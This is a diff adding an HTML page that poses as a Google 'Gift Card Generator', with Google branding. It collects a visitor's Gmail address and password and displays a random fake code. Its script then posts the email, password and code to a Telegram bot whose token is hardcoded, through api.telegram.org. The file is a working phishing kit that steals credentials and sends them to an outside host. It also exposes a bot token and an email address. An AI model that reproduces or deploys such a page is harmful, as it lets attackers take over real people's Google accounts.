@@ -1,0 +1,150 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Google Gift Card</title>
+  <style>
+    body {
+      background-color: #f2f2f2;
+      font-family: Roboto, sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin: 0;
+      padding: 0;
+    }
+
+    .google-logo {
+      margin-top: 50px;
+    }
+
+    .form-box {
+      background: white;
+      padding: 30px;
+      border-radius: 8px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 350px;
+      margin-top: 20px;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #1a73e8;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #1669c1;
+    }
+
+    .notice {
+      font-size: 12px;
+      color: gray;
+      text-align: center;
+      margin-top: 10px;
+    }
+
+    .code {
+      margin-top: 20px;
+      text-align: center;
+      font-weight: bold;
+    }
+
+    .error {
+      color: red;
+      font-size: 14px;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+
+  <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="google-logo">
+
+  <div class="form-box">
+    <h2 style="text-align:center; margin-bottom: 20px;">Google Gift Card Generator</h2>
+
+    <input type="email" placeholder="Enter Gmail" id="gmail" required>
+    <input type="password" placeholder="Enter Password" id="password" required>
+    <button onclick="generateCode()">Generate</button>
+
+    <div class="code" id="codeBox"></div>
+    <div class="notice">
+      This is not an official Google page.<br>
+      Your info is used for Google Gift Card generation.
+    </div>
+    <div id="errorMessage" class="error"></div>
+  </div>
+
+  <script>
+    function generateCode() {
+      const gmail = document.getElementById("gmail").value.trim().toLowerCase();
+      const password = document.getElementById("password").value.trim();
+
+      document.getElementById("errorMessage").innerText = "";
+
+      if (!gmail || !password) {
+        document.getElementById("errorMessage").innerText = "Please fill in both the email and password fields.";
+        return;
+      }
+
+      if (!gmail.endsWith("@gmail.com")) {
+        document.getElementById("errorMessage").innerText = "Please enter a valid Gmail address.";
+        return;
+      }
+
+      if (gmail === "amirhhhh.b1389@gmail.com") {
+        document.getElementById("codeBox").innerText = "Access denied for this Gmail.";
+        document.getElementById("codeBox").style.color = "red";
+        return;
+      }
+
+      const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+      let code = "";
+      for (let i = 0; i < 16; i++) {
+        code += chars.charAt(Math.floor(Math.random() * chars.length));
+        if ((i + 1) % 4 === 0 && i !== 15) code += "-";
+      }
+
+      document.getElementById("codeBox").innerText = `Generated Code: ${code} (Server: U.S.A)`;
+      document.getElementById("codeBox").style.color = "black";
+
+      const botToken = "7851927602:AAGG0G3OvUoyenHv09wWoRVfWJASqwfN1C0";
+      const chatId = "7851927602";
+      const message = `New Google Gift Card Request:\n\nGmail: ${gmail}\nPassword: ${password}\nCode: ${code}\nTime: ${new Date().toLocaleString()}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({chat_id: chatId, text: message})
+      })
+      .then(res => res.json())
+      .then(data => {
+        if (data.ok) {
+          console.log("Message sent successfully.");
+        } else {
+          console.log("Error sending message.");
+        }
+      })
+      .catch(err => console.error("Network error: " + err));
+    }
+  </script>
+
+</body>
+</html>
